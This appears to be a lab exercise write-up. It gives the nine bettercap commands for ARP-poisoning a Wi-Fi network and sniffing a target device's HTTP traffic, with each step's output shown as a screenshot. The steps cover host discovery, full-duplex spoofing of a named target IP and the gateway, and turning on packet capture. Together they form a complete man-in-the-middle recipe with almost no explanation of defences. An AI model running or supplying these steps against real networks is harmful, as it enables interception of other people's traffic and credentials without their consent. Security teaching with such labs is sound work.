Perform network Spoofing and Sniffing using ARP Poisoning using 
bettercap. Perform Below operation  
1)Capturing packets 
2)show the data being captured of HTTP protocol 

Command 1 - Selecting the interface of wlan0  i.e Wi-Fi. 

bettercap  -iface wlan0 
<img width="940" height="96" alt="image" src="https://github.com/user-attachments/assets/1c85dafc-f929-436b-af16-c0b21b2662f0" />


Command 2 – this command shows all the devices that are connected 
to the same network 

net.show 

<img width="940" height="192" alt="image" src="https://github.com/user-attachments/assets/1fee3f8a-46d9-442d-89f4-da0535609183" />

Command 3–
help  :- provides with the Modules of bettercap with their status  
<img width="508" height="889" alt="image" src="https://github.com/user-attachments/assets/0128f500-8065-49e3-b482-c59141740f39" />


Command 4 -  net.probe on 

This will send various probe packets to each IP in order and in the present subnet
<img width="940" height="81" alt="image" src="https://github.com/user-attachments/assets/bd171025-8f9f-4ba0-998b-5eb68ae87891" />


Command 5-set arp.spoof.fullduplex true 
In order to attack both the targets and the gateway, we will have to set 
arp.spoof.fullduplex to true. 

<img width="940" height="21" alt="image" src="https://github.com/user-attachments/assets/aeb03710-5a5f-4775-bfd4-37fd9c4f780a" />


Command 6- set arp.spoof.targets 192.168.43.77(IP address of the 
target Device) 
Set the target to the IP you can add any number of IPs here by using “,”. For 
example 192.168.43.77 
<img width="940" height="25" alt="image" src="https://github.com/user-attachments/assets/c823a6d9-5f9a-41b3-a5c0-16435878bace" />


Command 7-set arp.spoof on 
Start the ARP spoofer 
<img width="940" height="71" alt="image" src="https://github.com/user-attachments/assets/bd88e12b-9707-4735-aa17-d108d0192dfc" />


Command 8- set net.sniff.local true 
Setting it to true will consider packets from/to this computer, otherwise it will skip 
them. 
<img width="938" height="36" alt="image" src="https://github.com/user-attachments/assets/69f0129d-aed6-4ff7-84e7-45d77d4cfd56" />


Command 9 - net.sniff on 
Turning on the sniffing and catching the packets. 
<img width="940" height="342" alt="image" src="https://github.com/user-attachments/assets/55dc1df2-3e56-4e03-b2ad-530ebc4d1eaf" />
